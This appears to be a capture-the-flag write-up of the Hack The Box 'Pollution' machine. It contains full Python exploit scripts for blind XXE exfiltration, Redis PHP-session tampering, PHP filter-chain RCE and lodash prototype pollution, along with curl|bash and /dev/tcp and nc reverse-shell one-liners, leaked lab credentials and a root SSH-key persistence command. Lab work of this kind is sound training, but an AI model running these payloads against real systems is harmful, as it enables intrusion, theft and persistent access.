![](pollution_banner.png)

<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></a>
</p>


<!-- There is too much of python scripting in this writeup -->

# Enumeration

**IP-ADDR:** `10.10.11.192 collect.htb`

****nmap scan: TCP/IP****

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 db1d5c65729bc64330a52ba0f01ad5fc (RSA)
|   256 4f7956c5bf20f9f14b9238edcefaac78 (ECDSA)
|_  256 df47554f4ad178a89dcdf8a02fc0fca9 (ED25519)
80/tcp   open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.54 (Debian)
6379/tcp open  redis   Redis key-value store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

* There is a Redis server running on port 6379.
* Hostname found in the web app home page -> `collect.htb`

<div style="max-height: 500px; overflow: hidden; position: relative; margin-bottom: 20px;">
  <a href="screenshots/http-10.10.11.192.png">
    <img src="screenshots/http-10.10.11.192.png" style="clip-path: polygon(0 0, 100% 0, 100% 460px, 49% 490px, 51% 470px, 0 500px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 460px, 49% 490px, 51% 470px, 0 500px)" alt="image-20220608173116399">
  </a>
  <div style="position: absolute; right: 20px; top: 475px"><a href="screenshots/http-10.10.11.192.png"><i>Click for full image</i></a></div>
</div>

<!-- ![](screenshots/http-10.10.11.192.png) -->

`ffuf` found few vHosts
```bash
❯ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.collect.htb" -u "http://10.10.11.192" -ac -ic -t 100

... [snip] ...

[Status: 200, Size: 14098, Words: 910, Lines: 337, Duration: 4256ms]
    * FUZZ: forum

[Status: 401, Size: 469, Words: 42, Lines: 15, Duration: 930ms]
    * FUZZ: developers
```

* `developers.collect.htb` in returning 401 Unauthorized.
* `forum.collect.htb` is running "mybb" forum app -> https://mybb.com/

![](screenshots/http-forum.collect.htb.png)

* In the forum threads, they are taking about some "Pollution API".

After registering on the forum and walking through "Collect Forum", found a file attachment `proxy_history.txt` in "I had problems with the Pollution API" Thread .

![](screenshots/http-forum.collect.htb-file-attach.png)

# Foothold

## Burp history logs

Attachment file contain burp history logs, You can load in back to burp suite again using this extension -> https://github.com/iphoneintosh/BurpXMLExportViewer

In The file, there is a interesting HTTP request 

![](screenshots/proxy-history-http-request-1.png)

And sending POST request to same endpoint `/set/role/admin` with given token `token=ddac62a28254561001277727cb397baf`, got admin dashboard

![](screenshots/http-10.10.11.192-admin-dash.png)

<div style="max-height: 500px; overflow: hidden; position: relative; margin-bottom: 20px;">
  <a href="screenshots/http-10.10.11.192-admin-dash-2.png">
    <img src="screenshots/http-10.10.11.192-admin-dash-2.png" style="clip-path: polygon(0 0, 100% 0, 100% 460px, 49% 490px, 51% 470px, 0 500px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 460px, 49% 490px, 51% 470px, 0 500px)" alt="image-20220608173116399">
  </a>
  <div style="position: absolute; right: 20px; top: 475px"><a href="screenshots/http-10.10.11.192-admin-dash-2.png"><i>Click for full image</i></a></div>
</div>

<!-- ![](screenshots/http-10.10.11.192-admin-dash-2.png) -->

* In the admin dashboard, there is a "Registration form" for "Pollution API".
* Few interesting javascript files `/assets/js/delete_user.js` and `/assets/js/send_xml.js`

## out-of-band XXE to exfiltrate data

`send_xml.js` file contain "Registration form" function for "Pollution API", which sends POST request to `/api` with xml data form admin session to register account on "Pollution API".

![](screenshots/http-10.10.11.192-api-reg.png)

And from `proxy_history.txt` we know there is another endpoint `/auth/login`, where we can login into "Pollution API".

![](screenshots/http-10.10.11.192-api-login.png)

And this parameter is vulnerable for blind XXE and with that we can exfiltrate data from server -> https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#blind-ssrf-exfiltrate-data-out-of-band

Create dtd file, Host it on HTTP server
```dtd
<!ENTITY % file SYSTEM 'php://filter/convert.base64-encode/resource=../../../../etc/hostname'>
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://10.10.14.42/?file=%file;'>">
%eval;
%exfiltrate;
```

Inject xxe payload `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://10.10.14.42/exfiltrate.dtd"> %xxe;]>` in the API register call.
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://10.10.14.42/exfiltrate.dtd"> %xxe;]><root><method>POST</method><uri>/auth/register</uri><user><username>test</username><password>test</password></user></root>
```

![](screenshots/http-10.10.11.192-api-xxe-exfil.png)

**Exploit Script**
```py
#!/usr/bin/env python3

"""
Author: poorduck
Date: 2023-05-02
Description:

Usage: python script.py [FILENAME]
                        - Where FILENAME is the full path of the file from CWD

Example: python script.py '/etc/hostname'
"""

import threading
import http.server
from base64 import b64decode
import re
import requests
import string
import netifaces as ni
import os
import sys
import random
import pickle

# Get HackTheBox vpn ip from tun0 interface
try:
    tun0_ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
except ValueError as e:
    print("[!] tun0 not found!")
    exit(e)

session = requests.Session()
# session.proxies = {"http": "http://127.0.0.1:8080"}
host = "http://collect.htb"
rnd_word = ''.join(random.choices(string.ascii_letters, k=10))


# Custom handler for http server for handling received requests
class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def do_GET(self):
        # If the request has a "data" parameter
        if "file" in self.path:
            recv_data = re.findall(r"/\?file=(.*?)$", self.path)[0]
            base64_decoded = b64decode(recv_data).decode('UTF-8')
            print(f"[+] Data received -\n\n{base64_decoded}", end='')

        return http.server.SimpleHTTPRequestHandler.do_GET(self)

    # Suppress logging of HTTP requests
    def log_message(self, format, *args):
        pass


def start_server():
    server_address = ("", 8000)
    httpd = http.server.HTTPServer(server_address, RequestHandler)
    print("[+] Server started on port 8000")
    httpd.serve_forever()


def init_dtd(ip, filename):
    with open("exfiltrate.dtd", 'w') as f:
        dtd = f"""<!ENTITY % file SYSTEM 'php://filter/convert.base64-encode/resource={filename}'>
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://{ip}:8000/?file=%file;'>">
%eval;
%exfiltrate;
"""
        f.write(dtd)


def init_session(url, username, password):
    global session

    session_file = 'session.pickle'
    if os.path.exists(session_file):
        with open(session_file, 'rb') as f:
            session = pickle.load(f)
            return True
    else:
        print("[!] session not found, Creating new session")
        print(f"[+] Creating user with: {username}:{password}")

        account_info = {"username": username, "password": password}
        register = session.post(f"{url}/register", data=account_info)
        login = session.post(f"{url}/login", data=account_info)

        admin_token = {"token": "ddac62a28254561001277727cb397baf"}
        set_admin = session.post(f"{url}/set/role/admin", data=admin_token, allow_redirects=False)

        if set_admin.headers["Location"] == "/admin":
            with open(session_file, 'wb') as f:
                pickle.dump(session, f)
            return True
        else:
            return False


def send_payload(url, ip):
    payload = '<?xml version="1.0" encoding="UTF-8"?>' \
              f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{ip}:8000/exfiltrate.dtd"> %xxe;]>' \
              '<root><method>POST</method><uri>/auth/register</uri><user><username>test</username><password>test</password></user></root>'
    xxe_data = {"manage_api": payload}
    session.post(f"{url}/api", data=xxe_data)


if __name__ == "__main__":
    try:
        init_dtd(ip=tun0_ip, filename=sys.argv[1])
    except IndexError as e:
        exit("Usage: script.py <filename>")

    # Create the event object and start the server in a separate thread
    server_thread = threading.Thread(target=start_server)
    server_thread.daemon = True
    server_thread.start()

    is_session = init_session(url=host, username=rnd_word, password=rnd_word)
    if is_session:
        send_payload(url=host, ip=tun0_ip)
    else:
        exit("[-] Unknown session!")

```

![](screenshots/xxe-exfil-src-demo.gif)


* Got the main webroot path `/var/www/collect/public` from apache site config file `/etc/apache2/sites-available/000-default.conf`

`/var/www/collect/public/index.php` source code.
```php
<?php

require '../bootstrap.php';

use app\classes\Routes;
use app\classes\Uri;


$routes = [
    "/" => "controllers/index.php",
    "/login" => "controllers/login.php",
    "/register" => "controllers/register.php",
    "/home" => "controllers/home.php",
    "/admin" => "controllers/admin.php",
    "/api" => "controllers/api.php",
    "/set/role/admin" => "controllers/set_role_admin.php",
    "/logout" => "controllers/logout.php"
];

$uri = Uri::load();
require Routes::load($uri, $routes);
```

From `/var/www/collect/bootstrap.php`, Got Redis server password
```php
<?php
ini_set('session.save_handler','redis');
ini_set('session.save_path','tcp://127.0.0.1:6379/?auth=COLLECTR3D1SPASS');

session_start();

require '../vendor/autoload.php';
```

**Creds:** `COLLECTR3D1SPASS`

![](screenshots/redis-auth.png)

But we can not write in the webroot, so reverse shell is not possible from redis.

To be noted, redis server is handling php session and we can manipulate session to authenticate on the web app.

![](screenshots/redis-auth-keyspace-php-session-1.png)

## redis php session manipulation

There is another vHost `developers.collect.htb` which require authorization.

* Got "developers" webroot path `/var/www/developers` from apache site config file `/etc/apache2/sites-available/developers.collect.htb.conf`
  * In general, apache site config stored in this form after the default config `000-default.conf` -> `/etc/apache2/sites-available/<domain>.conf`

Config file also specified a auth file `/var/www/developers/.htpasswd` which contain "developers" authorization username and password hash.
```
developers_group:$apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1
```

Password hash cracked with john
```
❯ echo 'developers_group:$apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1' > hash

❯ john hash --show
developers_group:r0cket
```

**Creds:** `developers_group:r0cket`

After authenticate with the credentials, redirected to `/login.php`

![](screenshots/http-developers.collect.htb-login.png)

Viewing `/var/www/developers/index.php` source code.

![](screenshots/http-developers.collect.htb-index-sourcecode.png)

* it requite `auth=true` in the PHP session.
* After authentication, It is loading `/home.php` using `page` parameter, And this parameter passes it's value in `include()` function to load php files.

"developers" session also stored in the same redis server, we can verify it from `/var/www/developers/bootstrap.php`
```bash
<?php

ini_set('session.save_handler', 'redis');
ini_set('session.save_path', 'tcp://localhost:6379/?auth=COLLECTR3D1SPASS');

session_start();
```

When we authorize to `developers.collect.htb` it redirect to `/login.php` and creates a blank php session token.

From redis server, we can set `auth=true` in this blank session and authenticate to "developers" app.
```bash
10.10.11.192:6379> set PHPREDIS_SESSION:m5767e21hd2jkb0ra1sl8vg4h9 "auth|s:4:\"true\";"
```

![](screenshots/http-developers.collect.htb-home.png)

## PHP filter chain

Now we can use PHP filter chain in `page` param to get RCE, because it is inserting param value direct in the PHP `include()` function.

* https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html
* https://github.com/synacktiv/php_filter_chain_generator

There is Request-URI length limit, So we need to use a short payload to get  reverse shell -> ```<?= `curl 10.10.14.40:8000|bash` ;?>```
```bash
curl -s https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/main/php_filter_chain_generator.py | python - --chain '<?= `curl 10.10.14.40:8000|bash` ;?>'
```

* Host bash reverse shell in a `index.html` on http server.

![](screenshots/http-developers.collect.htb-rev-shell.png)


**Exploit Script**
```py
#!/usr/bin/env python3

"""
Author: poorduck
Date: 2023-05-02
Description:

Usage: python script.py
"""

import requests
import os
import netifaces as ni
import threading
import http.server
import socketserver
import redis

# Get hackthebox vpn ip from tun0 interface
try:
    tun0_ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
except ValueError as e:
    print("[!] tun0 not found!")
    exit(e)

session = requests.Session()
# session.proxies = {"http": "http://127.0.0.1:8080"}
session.headers = {"Authorization": "Basic ZGV2ZWxvcGVyc19ncm91cDpyMGNrZXQ="}
host = "http://developers.collect.htb"

# function for creating php filter chain using synacktiv "php_filter_chain_generator.py" script from github
def gen_php_chain(ip):
    command = f'curl -s https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/main/php_filter_chain_generator.py | python - --chain \'<?= `curl {ip}:8000|bash` ;?>\''
    output_file = os.popen(command)
    output = output_file.read()
    output_file.close()
    php_chain = output.split('\n')[1]
    return php_chain

# hosting reverse shell on a python simple http server
def start_http_server(port, ip):

    shell = f'/bin/sh -i >& /dev/tcp/{ip}/4141 0>&1'

    with open('index.html', 'w') as f:
        f.write(shell)

    try:
        Handler = http.server.SimpleHTTPRequestHandler
        httpd = socketserver.TCPServer(("", port), Handler)

        print("[+] Serving at port", port)
        httpd.serve_forever()
    except OSError as e:
        print(e)

def developers_auth(url):

    get_sess = session.get(url)
    sess_token = session.cookies.get('PHPSESSID')
    print("[+] New session token:", sess_token)

    redis_client = redis.Redis(host='10.10.11.192', port=6379, password='COLLECTR3D1SPASS')
    keys = redis_client.keys('*')

    for key in keys:
        if sess_token in key.decode():
            is_ok = redis_client.set(key, "auth|s:4:\"true\";")
            if is_ok:
                return True
            else:
                return False


try:
    # Start http server on child thread
    port = 8000
    http_thread = threading.Thread(target=start_http_server, args=(port,tun0_ip))
    http_thread.daemon = True
    http_thread.start()
    
    # Generate php chain
    rce_chain = gen_php_chain(tun0_ip)
    is_auth = developers_auth(url=host)

    if is_auth:
        session.get(f"{host}/?page={rce_chain}", timeout=10)
    else:
        print("[-] developers auth error!")

except KeyboardInterrupt as e:
    print(e)
except Exception as e:
    print(e)
finally:
    if os.path.isfile("index.html"): os.remove("index.html")

```

![](screenshots/http-developers.collect.htb-rev-shell-script.png)

# Privesc

Got shell as "www-data".

There are few service running in localhost
```bash
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
```

* Port 3000 is the "Pollution API".
* Port 3306 is running mysql server.
* Port 9000 is unknown.

Only One user on the box
```bash
╔══════════╣ Users with console
root:x:0:0:root:/root:/bin/bash
victor:x:1002:1002::/home/victor:/bin/bash
```

* From `/etc/php/8.1/fpm/pool.d/www.conf`, we can confirm that port 9000 is running "php-fpm" service from user "**victor**".
* And form `/var/www/forum/inc/config.php` found some creds for mysql server.

```conf
$config['database']['hostname'] = 'localhost';
$config['database']['username'] = 'webapp_user';
$config['database']['password'] = 'Str0ngP4ssw0rdB*12@1';
```

**Creds:** `webapp_user:Str0ngP4ssw0rdB*12@1`

## php-fpm RCE

There is a way to get arbitrary code execution on FastCGI.

* Exploit -> https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75

Upload exploit script on the box and run it.
```bash
python3 fpm.py 127.0.0.1 /var/www/collect/public/index.php -c "<?php echo system('whoami'); exit; ?>"
```

![](screenshots/port-9000-php-fpm-rce.png)

You can exploit it using the above php filter chain exploit script, Just replace shell variable in `start_http_server()` function with this and start netcat listener on PORT 4141.
  * Make sure that `fpm.py` script is in the same directory.
```py
# Get direct shell as user "victor" by exploiting php-fpm from "www-data" shell
shell = f"curl -s http://{ip}:8000/fpm.py | python3 - 127.0.0.1 /var/www/collect/public/index.php -c \"<?php echo system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} 4141 >/tmp/f'); exit; ?>\""
```

![](screenshots/http-developers.collect.htb-victor-shell-script.png)

![](screenshots/filterchain-fmp-rce-src-demo.gif)

Got shell as user "victor", Now move on the the mysql server, we Didn't checked the mysql creds which we found before.

Didn't find anything interesting in the mysql.

## lodash merge prototype pollution

There is the "Pollution API" source code in the user's home directory.
```bash
victor@pollution:~$ ls -l pollution_api/
total 108
drwxr-xr-x  2 victor victor  4096 Nov 21 11:34 controllers
drwxr-xr-x  2 victor victor  4096 Nov 21 11:34 functions
-rw-r--r--  1 victor victor   528 Sep  2  2022 index.js
-rwxr-xr-x  1 victor victor   574 Aug 26  2022 log.sh
drwxr-xr-x  5 victor victor  4096 Nov 21 11:34 logs
drwxr-xr-x  2 victor victor  4096 Nov 21 11:34 models
drwxr-xr-x 97 victor victor  4096 Nov 21 11:34 node_modules
-rw-r--r--  1 victor victor 71730 Aug 26  2022 package-lock.json
-rw-r--r--  1 victor victor   160 Aug 26  2022 package.json
drwxr-xr-x  2 victor victor  4096 Nov 21 11:34 routes
```

I create a tar archive of the source code and download it in my local machine
```bash
tar -czvf pollution_api.tar.gz --exclude=node_modules --exclude=package-lock.json pollution_api/
```

[snyk](https://security.snyk.io/) was unable to find that, But going though the source code -

* There is a admin route in the api.
* `pollution_api/routes/admin.js` has a route `/messages/send` which uses `pollution_api/controllers/Messages_send.js`
* There is a `messages_send()` function in `Messages_send.js`, the function creates a new message object, which includes the `user_sent` property from the decoded JWT token and a `title` property with the value "Message for admins". The rest of the properties in `req.body` are merged into the message object using `_.merge` from the lodash module.
* When user send POST request to `/admin/messages/send` endpoint from admin session with `text` parameter contains the message it merged into message object using `lodash.merge`

`Messages_send.js` Script -

![](screenshots/pollution-api-source-1.png)

* lodash version is used by the application is `4.17.0`.
* and It is vulnerable for prototype pollution -> https://github.com/Kirill89/prototype-pollution-exploits/tree/master/lodash
* And we can abuse it to execute arbitrary code -> https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce

Only thing is required is the admin token, And "Pollution API" users details are stored in the mysql database. So we can update the user details after registering new user in the API.


lodash merge prototype pollution payload - 
```json
{"text": {"constructor": {"prototype": {"shell":"/proc/self/exe", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\"child_process\").execSync(\"touch /tmp/pp2rce2\").toString())//"}}}}
```

<!-- Manual steps are missing, but I am feeling lazy. -->

```py
#!/usr/bin/env python3

"""
Author: poorduck
Date: 2023-05-02
Description: Blind command injection using lodash.merge prototype pollution

Usage: python script.py [COMMAND]
                        - Where COMMAND is a system to execute in the target system

Example: python script.py 'ping -c2 10.10.14.46'
"""

import requests
import json
import subprocess
import sys

session = requests.Session()
host = "http://127.0.0.1:3000"
username = "poorduck"
password = "p00rduck"


# Step 1
def register_user(url, user, password):
    resp = session.post(f"{url}/auth/register", json={"username": user, "password": password})
    status = json.loads(resp.text)["Status"]
    print("[+] Register status:", status)
    if "This user already exists" or "Ok" in status:
        return True
    else:
        return False

# Step 2
def update_user_role(user):
    print("... updating User role")
    cmd = f"mysql -u webapp_user -pStr0ngP4ssw0rdB*12@1 -e \"USE pollution_api; UPDATE users SET role = 'admin' WHERE username = '{user}';\""
    subprocess.run(cmd, shell=True)

    cmd = f"mysql -u webapp_user -pStr0ngP4ssw0rdB*12@1 -e \"SELECT role FROM pollution_api.users WHERE username = '{user}'\""
    is_admin = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE)
    if 'admin' in is_admin.stdout.decode():
        return True
    else:
        return False

# Step 3
def admin_token(url, user, password):
    resp = session.post(f"{url}/auth/login", json={"username": user, "password": password})
    status = json.loads(resp.text)
    print("[+] Login status:", status["Status"])
    if status["Status"] == "Ok":
        return status["Header"]
    else:
        return False

# Step 4
def pollute_it(url, cmd):
    carbon_dioxide = {"text": {"constructor": {"prototype": {"shell":"/proc/self/exe", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": f"console.log(require(\"child_process\").execSync(\"{cmd}\").toString())//"}}}}
    resp = session.post(f"{url}/admin/messages/send", json=carbon_dioxide)
    status = json.loads(resp.text)["Status"]
    print("[+] Pollution status:", status)
    if status == "Ok":
        return True
    else:
        exit("[-] Unable to pollute!")


if __name__ == "__main__":
    try:

        cmd = sys.argv[1]
        admin_header = {}
        is_registered = register_user(url=host, user=username, password=password)
        if is_registered:
            is_admin = update_user_role(user=username)
            if is_admin:
                is_login = admin_token(url=host, user=username, password=password)
                if is_login:
                    admin_header = is_login
                else:
                    exit(1)
            else:
                exit(1)
        else:
            exit(1)

        session.headers = admin_header
        pollute_it(url=host, cmd=cmd)
    
    except KeyboardInterrupt as e:
        print(e)
    except IndexError as e:
        exit("Usage: script.py <command>")
    except Exception as e:
        print(e)

```

![](screenshots/rooted.gif)

<!--

ssh -i id_rsa victor@collect.htb "curl -s http://10.10.14.40:8000/pollution.py | python3 - 'echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN3AYlujWz8DVYtSkVPFdbnFnb9AcIEXf6HycsZX2asy >> /root/.ssh/authorized_keys;chmod 600 /root/.ssh/authorized_keys'"

-->
